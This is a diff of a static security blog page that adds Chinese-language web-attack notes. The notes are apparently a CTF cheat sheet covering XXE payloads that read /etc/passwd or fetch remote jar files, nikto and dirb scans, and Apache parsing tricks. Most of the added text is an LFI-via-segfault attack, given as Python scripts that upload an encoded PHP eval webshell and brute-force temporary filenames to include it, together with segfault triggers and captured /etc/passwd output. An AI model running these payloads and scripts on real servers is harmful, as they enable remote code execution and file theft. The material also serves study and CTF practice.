@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">256</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">1,272</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -406,6 +406,40 @@
 <p>into dumpfile:导出二进制文件</p>
 <h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">php_flag engine 1</span><br></pre></td></tr></table></figure>
 <p>php_flag 打开或者关闭PHP解析，本指令仅在使用PHP的Apache模块版本时才有用，可以基于目录或者虚拟主机来打开或者关闭PHP，将engine off放到httpd.conf文件中适当的位置就可以激活或者禁用PHP。</p>
+<h2 id="XXE-payload"><a href="#XXE-payload" class="headerlink" title="XXE payload"></a>XXE payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;data xmlns:xi=&quot;http://wwww.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;&gt;</span><br><span class="line">&lt;/xi:include&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="java-XXE特殊payload："><a href="#java-XXE特殊payload：" class="headerlink" title="java XXE特殊payload："></a>java XXE特殊payload：</h2><p>参考: <a href="https://www.anquanke.com/post/id/164818" rel="external nofollow" target="_blank">https://www.anquanke.com/post/id/164818</a></p>
+<p>java 支持一个 netdoc 协议，能完成列目录的功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;netdoc:///var/www/html/&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+<p>java 的 jar:// 协议，通过这个协议我们能向远程服务器去请求文件（没错是一个远程的文件，这相比于 php 的 phar 只能请求本地文件来说要强大的多），并且在传输过程中会生成一个临时文件在某个临时目录中.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;jar:http://ip:port/jar.zip!/1.php&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="nikto信息搜集"><a href="#nikto信息搜集" class="headerlink" title="nikto信息搜集"></a>nikto信息搜集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h [url]</span><br></pre></td></tr></table></figure>
+<h2 id="dirb扫目录"><a href="#dirb扫目录" class="headerlink" title="dirb扫目录"></a>dirb扫目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb [url]</span><br><span class="line">或者指定字典:</span><br><span class="line">dirb [url] [字典_path]</span><br></pre></td></tr></table></figure>
+<h2 id="apache解析"><a href="#apache解析" class="headerlink" title="apache解析"></a>apache解析</h2><ol>
+<li><code>.php.xxx</code>，由于xxx不是正确的后缀，所以apache会向前寻找，找到php就解析</li>
+<li><code>.php%0a</code>，也行</li>
+</ol>
+<h2 id="上传问题"><a href="#上传问题" class="headerlink" title="上传问题:"></a>上传问题:</h2><p>参考链接：</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/164561" rel="external nofollow" target="_blank">https://www.anquanke.com/post/id/164561</a></li>
+</ul>
+<h2 id="PHP序列化总结"><a href="#PHP序列化总结" class="headerlink" title="PHP序列化总结"></a>PHP序列化总结</h2><ul>
+<li><a href="http://www.91ri.org/15925.html" rel="external nofollow" target="_blank">http://www.91ri.org/15925.html</a></li>
+</ul>
+<h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><h4 id="LFI-via-SegmentFault"><a href="#LFI-via-SegmentFault" class="headerlink" title="LFI via SegmentFault"></a>LFI via SegmentFault</h4><p>LFI的同时，上传文件，通过某些问题触发PHP SegmentFault,从而使得PHP临时文件不被删除，然后爆破文件名，getshell.</p>
+<p><img src="/assets/web/20180320073457-22703748-2bce-1.jpg" alt=""></p>
+<p>经测试: php7.0可用，php7.1可用，php7.2不可用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT$ php -v</span><br><span class="line">PHP 7.0.30-0ubuntu0.16.04.1 (cli) ( NTS )</span><br><span class="line">Copyright (c) 1997-2017 The PHP Group</span><br><span class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.30-0ubuntu0.16.04.1, Copyright (c) 1999-2017, by Zend Technologies</span><br><span class="line">ht@TIANJI:/mnt/c/Users/HT$ php -r &apos;print_r(file_get_contents(&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;));&apos;</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tiandiwuji@tiandiwuji:~$ php -v</span><br><span class="line">PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies</span><br><span class="line">tiandiwuji@tiandiwuji:~$ php -r &apos;print_r(file_get_contents(&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;));&apos;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+<p>脚本，上传多个文件:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.43.155"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>爆破文件名:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">filenames = itertools.product(charset,repeat=6)</span><br><span class="line">for i in filenames:</span><br><span class="line">    filename = &quot;&quot;.join(i)</span><br><span class="line">    print filename</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = &quot;192.168.43.155&quot;</span><br><span class="line">port = 80</span><br><span class="line">base_url = &quot;http://%s:%d&quot; % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_force_tmp_files():</span><br><span class="line">    for i in charset:</span><br><span class="line">        for j in charset:</span><br><span class="line">            for k in charset:</span><br><span class="line">                for l in charset:</span><br><span class="line">                    for m in charset:</span><br><span class="line">                        for n in charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = &quot;%s/include.php?f=/tmp/php%s&quot; % (</span><br><span class="line">                                base_url, filename)</span><br><span class="line">                            print url</span><br><span class="line">                            try:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                if &apos;flag&apos; in response.content:</span><br><span class="line">                                    print &quot;[+] Include success!&quot;</span><br><span class="line">                                    return True</span><br><span class="line">                            except Exception as e:</span><br><span class="line">                                print e</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>payload: php7.* 可用</p>
+<p>原理需要自己调试一下: <a href="https://hackmd.io/s/Hk-2nUb3Q" rel="external nofollow" target="_blank">https://hackmd.io/s/Hk-2nUb3Q</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.0,php7.1,php7.2,php7.3均可用。</span><br><span class="line">tiandiwuji@tiandiwuji:~$ php -r &quot;file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&apos;));&quot;</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
+<h2 id="base64decode"><a href="#base64decode" class="headerlink" title="base64decode"></a>base64decode</h2><p>实际解码过程:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&apos;txt&apos;] = preg_replace(&apos;|[^a-z0-9A-Z+/]|s&apos;, &apos;&apos;, $_GET[&apos;txt&apos;]);</span><br><span class="line">base64_decode($_GET[&apos;txt&apos;]);</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -430,8 +464,8 @@
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/posts/29914/" title="ssrf+gopher">
-                    <div class="prevTitle">ssrf+gopher</div>
+                <a href="/posts/22546/" title="googlectf2018">
+                    <div class="prevTitle">googlectf2018</div>
                 </a>
             
         </li>
@@ -544,7 +578,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dumpfile和outfile的区别"><span class="toc-number">1.</span> <span class="toc-text">dumpfile和outfile的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-number">2.</span> <span class="toc-text">.htaccess</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dumpfile和outfile的区别"><span class="toc-number">1.</span> <span class="toc-text">dumpfile和outfile的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-number">2.</span> <span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-payload"><span class="toc-number">3.</span> <span class="toc-text">XXE payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java-XXE特殊payload："><span class="toc-number">4.</span> <span class="toc-text">java XXE特殊payload：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nikto信息搜集"><span class="toc-number">5.</span> <span class="toc-text">nikto信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dirb扫目录"><span class="toc-number">6.</span> <span class="toc-text">dirb扫目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache解析"><span class="toc-number">7.</span> <span class="toc-text">apache解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传问题"><span class="toc-number">8.</span> <span class="toc-text">上传问题:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP序列化总结"><span class="toc-number">9.</span> <span class="toc-text">PHP序列化总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP文件包含"><span class="toc-number">10.</span> <span class="toc-text">PHP文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LFI-via-SegmentFault"><span class="toc-number">10.0.1.</span> <span class="toc-text">LFI via SegmentFault</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#base64decode"><span class="toc-number">11.</span> <span class="toc-text">base64decode</span></a></li>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1392,9 +1426,261 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 71
         </div>
         <!-- search  -->
         
@@ -1405,8 +1691,97 @@
     
     
     
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1416,11 +1791,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
         </li>
     
     
@@ -1440,7 +1810,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
         </li>
     
     
@@ -1560,17 +1930,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
         </li>
     
     
@@ -1615,12 +1980,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1640,7 +2005,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
         </li>
     
     
@@ -1698,19 +2063,25 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1722,9 +2093,9 @@
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
-        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
